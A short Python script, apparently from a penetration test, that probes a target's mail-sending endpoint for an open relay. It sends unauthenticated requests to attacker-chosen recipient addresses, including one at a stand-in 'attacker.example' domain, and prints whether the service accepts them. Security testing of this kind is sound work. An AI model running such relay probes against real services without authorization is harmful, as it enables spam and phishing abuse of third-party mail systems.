import time
from send_lib import send, base
import net2 as net

# Re-verify relay, no auth headers/cookies at all, different external domain
c, h, b = send(base(targets="vapt.probe.98765@gmail.example"), tries=20)
print("RELAY gmail.example ->", c, b[:220])
print("has set-cookie/auth:", [l for l in h.splitlines() if l.lower().startswith(("set-cookie", "www-auth"))])
time.sleep(1.2)
# Third: confirm recipient is fully attacker chosen, not restricted to a domain
for dom in ["yandex.example", "mail.ru.example", "a@sub.attacker.example"]:
    c, h, b = send(base(targets="probe@%s" % dom), tries=20)
    print("relay", dom, c, b[:80])
    time.sleep(1.2)
